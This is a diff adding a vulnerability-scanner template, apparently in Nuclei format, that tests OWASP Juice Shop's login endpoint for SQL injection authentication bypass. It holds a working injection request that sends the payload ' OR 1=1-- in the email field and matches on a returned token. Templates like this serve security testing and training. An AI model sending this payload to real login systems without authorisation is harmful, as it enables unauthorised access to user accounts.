@@ -1,0 +1,25 @@
+id: juiceshop-sqli-login-bypass
+info:
+  name: SQL injection authentication bypass on /rest/user/login
+  author: devtestsecops-demo
+  severity: critical
+  description: |
+    The login endpoint concatenates the email field into a raw SQL query.
+    A payload of ' OR 1=1-- authenticates as the first user without a password.
+  tags: juiceshop,sqli,auth,owasp
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"email":"' OR 1=1--","password":"x"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["authentication", "token"]
+        condition: and
